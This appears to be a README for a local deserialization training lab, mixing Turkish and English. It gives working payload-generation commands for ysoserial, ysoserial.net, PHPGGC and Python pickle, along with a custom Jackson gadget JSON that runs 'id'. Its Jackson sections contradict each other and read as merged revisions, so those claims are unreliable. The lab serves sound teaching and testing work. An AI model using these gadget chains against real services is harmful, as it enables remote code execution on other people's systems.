# Payload generator'ları: kim yazdı, içinde ne var?

**Generator ile hedef uygulama farklı roller üstlenir.** Generator, yerelde bir nesneyi ilgili dilin serialization biçimine dönüştürür. Web servisi bu veriyi alıp deserialize eder. Payload'ı hedef konteynerin içinde üretmek **zorunlu değildir**: `docker compose exec ... --generate-benign` komutları yalnızca aynı runtime sürümünü hazır bulundurmak için kolaylıktır. Normalde payload'ı kendi bilgisayarında üretip Burp ile HTTP isteğine eklersin.

| Lab | Normal örneği kim üretiyor? | Test/gadget örneğini kim üretiyor? | Serileştirilmeden önce içerik |
|---|---|---|---|
| Jackson (8081) | Manuel JSON (generator yok) | Manuel JSON (özel öğretim zinciri) | Normalde `message: hello`; testte `WorkflowEnvelope` / `TaskRouter` / `ProcessAction` ve `command: id` |
| .NET (8082) | **Projede yazdığım** `Program.cs --generate-benign` | Ayrı **ysoserial.net** aracı | Normalde `System.String("hello-from-dotnet")`; dış gadget tool kendi nesne grafiğini kurar |
| PHP (8083) | **Projede yazdığım** `generate.php` | Ayrı **PHPGGC** aracı | Normalde `['message' => 'hello-from-php', 'count' => 1]`; PHPGGC Monolog nesneleri kurar |
| Python (8084) | **Projede yazdığım** `generate.py --benign` | **Aynı dosyada benim yazdığım** `PicklePayloadBuilder` | Normalde dict; testte `__reduce__()` `(subprocess.call, (["/usr/bin/id"],))` döndürür |
| Java native (8085) | **Projede yazdığım** `NativeDeserApp --generate-benign` | Ayrı **ysoserial** aracı | Normalde tek elemanlı `ArrayList("hello-from-java")`; dış araç CommonsCollections6 nesne grafiği kurar |

## Benim yazdığım generator'lar gerçekte ne yapıyor?

- **.NET — `dotnet-binaryformatter/Program.cs`:** `BinaryFormatter.Serialize()` ile yalnızca `hello-from-dotnet` string'ini bir `MemoryStream` içine yazar ve byte'ları Base64'e çevirir. Burada gadget yoktur.
- **PHP — `php-unserialize/generate.php`:** `serialize(['message'=>'hello-from-php','count'=>1])` üretir ve Base64'e çevirir. Gadget yoktur.
- **Python — `python-pickle/generate.py`:** `--benign` ile `{'message':'hello-from-python','count':1}` sözlüğünü pickle eder. Argümansız kullanıldığında `PicklePayloadBuilder` sınıfını pickle eder; `__reduce__()` serileştirme sırasında hedefte yeniden oluşturma tarifi olarak `subprocess.call` + `/usr/bin/id` argümanını kodlar. **Komut generator çalıştırılırken değil, hedefte `pickle.loads()` çağrıldığında tetiklenir.** Bu örnek bir paket zafiyeti/CVE değildir; pickle'ın standart mekanizmasını gösterir.
- **Java native — `NativeDeserApp --generate-benign`:** `ArrayList` içine `hello-from-java` koyup `ObjectOutputStream.writeObject()` ile Java binary stream üretir ve Base64'e çevirir. Gadget yoktur.
- **Jackson:** Ayrı generator yoktur; hem normal hem de özel öğretim gadget JSON'u doğrudan metindir. `@class`, Jackson'ın hangi sınıfı instantiate edeceğini belirtir. Özel gadget gerçek bir XBean CVE'si değildir.

**Dış araçların ürettiği veri:** `ysoserial`, `ysoserial.net`, `PHPGGC` bu projenin yazdığı generator'lar değil, harici araştırma araçlarıdır. Bunlar bir veya daha fazla nesne/referans barındıran serialized graph oluşturur; exact binary içeriği kullanılan tool sürümüne, gadget seçimine ve komuta göre değişir. Base64 bir şifreleme değildir, sadece binary taşıma biçimidir. Aşağıdaki komutlarla normal ve gadget payload üretimini ayrı ayrı karşılaştırabilirsin.

---

# Jackson: only `resp` in the HTTP response

The Jackson service on `http://127.0.0.1:8081` accepts **raw JSON** at `POST /api/deserialize`. Both examples use the same endpoint and the same **Run** button.

## Normal JSON

```json
{"@class":"java.util.LinkedHashMap","message":"hello"}
```

Expected HTTP response:

```json
{"resp":"hello"}
```

## Custom gadget command-execution example

```json
{"@class":"lab.WorkflowEnvelope","router":{"@class":"lab.TaskRouter","action":{"@class":"lab.ProcessAction","command":"id"}}}
```

Expected HTTP response *if the OS process executes successfully* (UID/GID varies):

```json
{"resp":"uid=10001(lab) gid=999(lab) groups=999(lab)"}
```

Only actual lines emitted as `[os stdout]` are included in `resp`; there is no fabricated success output. Gadget debug traces are no longer exposed via this HTTP response. Errors also use `{ "resp": "Error: ..." }` with corresponding HTTP status for validation exceptions.

Rebuild the Jackson service:

```powershell
docker compose up -d --build --force-recreate java
```

The gadget classes are purpose-built training classes, **not** an XBean CVE-2020-8840 exploit.

---

# Jackson custom gadget RCE — updated payloads

This version's Java Jackson lab uses a **custom teaching gadget**, not a verified CVE-2020-8840/XBean exploit. Java JSON input goes to http://127.0.0.1:8081. Both inputs use the **same Run button**.

### Normal JSON

```json
{"@class":"java.util.LinkedHashMap","message":"hello-from-jackson","count":1}
```

Expected: `Deserialized type` / `[result] Type` indicates `java.util.LinkedHashMap`; no OS execution.

### Gadget JSON

```json
{"@class":"lab.WorkflowEnvelope","router":{"@class":"lab.TaskRouter","action":{"@class":"lab.ProcessAction","command":"id"}}}
```

Expected: setter and dispatch trace culminating in `[os stdout] uid=...` and `[os exit] 0`. Execution is in the **Linux container**, not on your Windows host. For a file side effect, use `touch /tmp/jackson-proof` and verify with `docker compose exec java ls -l /tmp/jackson-proof` (tmpfs is ephemeral).

---

# Payloads — one Run button per site

Each page contains **one input textarea and one `Run` button**. Benign and gadget data traverse exactly the same vulnerable sink. The browser prints object type/value when available, stdout, stderr, exit code, and observed side-effects. Examples below are **expected**, not claimed observed results.

**Launch all five:** `docker compose up --build -d` (PowerShell, from this folder). Never publish outside `127.0.0.1`.

## 1. Java Jackson JSON — http://127.0.0.1:8081

**Normal JSON:**
```json
{"@class":"java.util.LinkedHashMap","message":"hello-from-jackson","count":1}
```
Expected type: `java.util.LinkedHashMap`; value contains `message` and `count`.

**Alternate genuine JDK class selected by JSON (not RCE):**
```json
{"@class":"java.util.TreeMap","z":"last","a":"first"}
```
Expected type: `java.util.TreeMap`; entries sorted (`a`, `z`). **Not an RCE exploit.** Both classes are genuine JDK implementations. Old Jackson RCE gadgets should not be assumed compatible with Jackson 2.17.2. This lab demonstrates permissive polymorphic type resolution; the separate native Java lab demonstrates a concrete library gadget chain.

## 2. .NET BinaryFormatter — http://127.0.0.1:8082

**Normal BinaryFormatter Base64** (copy one-line output):
```powershell
docker compose exec -T dotnet mono /app/DeserLab.exe --generate-benign
```
Expected: `Deserialized type: System.String`, `hello-from-dotnet`.

**Framework gadget generated with ysoserial.net** (on a compatible Windows environment):
```powershell
.\ysoserial.exe -g TypeConfuseDelegateMono -f BinaryFormatter -c "id" -o base64
```
Paste the Base64 only. IMPORTANT: the service is **Mono on Linux**; `TypeConfuseDelegate` may fail because of runtime and OS assumptions. On Mono, test the upstream `TypeConfuseDelegateMono` generator if available (check `ysoserial.exe -h` for your version). A crash is **not proof of execution**. The exact gadget compatibility has not been verified in Docker.

## 3. PHP Monolog — http://127.0.0.1:8083

**Normal PHP serialization**:
```powershell
docker compose exec -T php php /app/generate.php
```
Expected: type `array`, values `message=hello-from-php`, `count=1`.

**Real Composer library gadget via PHPGGC (Monolog/RCE1)**:
```powershell
docker compose exec -T php sh -lc 'php /opt/phpggc/phpggc Monolog/RCE1 system id | base64 -w0; echo'
```
Paste the resulting one-line Base64 into the site. This instructs the existing Monolog gadget chain to call `system('id')`; the target does **not** declare a custom magic-method gadget. The output may contain `uid=... gid=...` from the container; if not, inspect stderr/exception and check the exact PHP, Monolog and PHPGGC compatibility. `__destruct()`-based chains may run after reconstruction, not necessarily within the call to `unserialize()` itself.

## 4. Python pickle — http://127.0.0.1:8084

**Normal dictionary pickle**:
```powershell
docker compose exec -T python python3 /app/generate.py --benign
```
Expected: `dict`, `{'message': 'hello-from-python', 'count': 1}`.

**Built-in `REDUCE` opcode demonstration**:
```powershell
docker compose exec -T python python3 /app/generate.py
```
Expected stdout may contain the `id` command output, and reconstructed value may be integer `0` (subprocess exit code). The *generator* implements `__reduce__`, but the *target* has no custom gadget: `pickle.loads()` resolves the existing `subprocess.call` callable.

## 5. Java native Commons Collections — http://127.0.0.1:8085

**Normal Java serialized ArrayList**:
```powershell
docker compose exec -T java-native java -cp '/app/classes:/app/dependency/*' lab.NativeDeserApp --generate-benign
```
Expected: type `java.util.ArrayList`, value `[hello-from-java]`.

**Genuine CommonsCollections6 ysoserial gadget**, using an existing `ysoserial-all.jar` on your host:
```powershell
python -c "import base64,subprocess; p=subprocess.check_output(['java','-jar','ysoserial-all.jar','CommonsCollections6','touch /tmp/cc6-proof']); print(base64.b64encode(p).decode('ascii'))"
```
Paste Base64 in the site. The **fresh marker** `/tmp/cc6-proof` is the expected proof of command execution; the UI deletes a prior marker before each request and checks for its creation after the process finishes. To verify separately:
```powershell
docker compose exec java-native ls -l /tmp/cc6-proof
```
JDK/ysoserial compatibility can vary. Side effects may occur even if a later deserialization step throws.

## Evidence reading

- Type/value proves object reconstruction, **not** RCE.
- stdout from a command or a **newly created** proof marker is more meaningful evidence of a side effect.
- Exit code `0` does **not** prove an exploit; nonzero does **not** always disprove side effects.
- Observations in the web page are generated at runtime. Documentation examples are not verified transcripts.

## RCE verification matrix (important)

| Endpoint | Real gadget/mechanism | RCE evidence status |
|---|---|---|
| 8081 Jackson | Java polymorphic type resolver + JDK types | **NO RCE chain verified**; do not present class instantiation as RCE |
| 8082 .NET | `ysoserial.net` `TypeConfuseDelegateMono` candidate | Requires Mono-specific runtime validation; exit code alone is insufficient |
| 8083 PHP | Third-party Monolog 2.3.0 `Monolog/RCE1` | Expect stdout from `system('id')` when compatible |
| 8084 Python | Standard library `pickle` REDUCE resolves `subprocess.call` | Expect `id` stdout / process return status |
| 8085 Java native | Commons Collections 3.2.1 `CommonsCollections6` | Fresh `/tmp/cc6-proof` marker tracked per request |

A fully functional **real Jackson RCE** test needs a separately pinned, verified vulnerable Jackson release, gadget library, dependent components and a tested JSON payload. The included Java JSON demo does not supply that chain. No exploit success is asserted without observed stdout or a side-effect marker.

## Jackson/XBean CVE-2020-8840 update (8081)

The Java Jackson service has been pinned to `jackson-databind:2.9.10.2`, `xbean-reflect:4.18`, Java 8. This meets the historical **dependency/version conditions** for studying CVE-2020-8840; it does **not** constitute a working RCE PoC.

Normal JSON (paste directly into the same Run field):

```json
{"@class":"java.util.LinkedHashMap","message":"hello-from-jackson","count":1}
```

Expected evidence: Jackson version, XBean class available, reconstructed LinkedHashMap type and value. **No exploit payload or confirmed RCE proof is supplied for this Jackson/XBean configuration.** Do not interpret `XBean JndiConverter present: true` or exit code 0 as RCE. Consult `java-jackson-json/README.md` for separate evidence thresholds.


## Jackson HTTP transport (Burp Repeater)

**The JSON must be the raw request body**, not a `payload` form parameter. Send both normal and gadget JSON from the Jackson examples above to:

```http
POST /api/deserialize HTTP/1.1
Host: 127.0.0.1:8081
Content-Type: application/json

{
  "@class": "java.util.LinkedHashMap",
  "message": "normal"
}
```

Use the same endpoint for the gadget JSON. The HTTP response is JSON with the actual Java subprocess output.
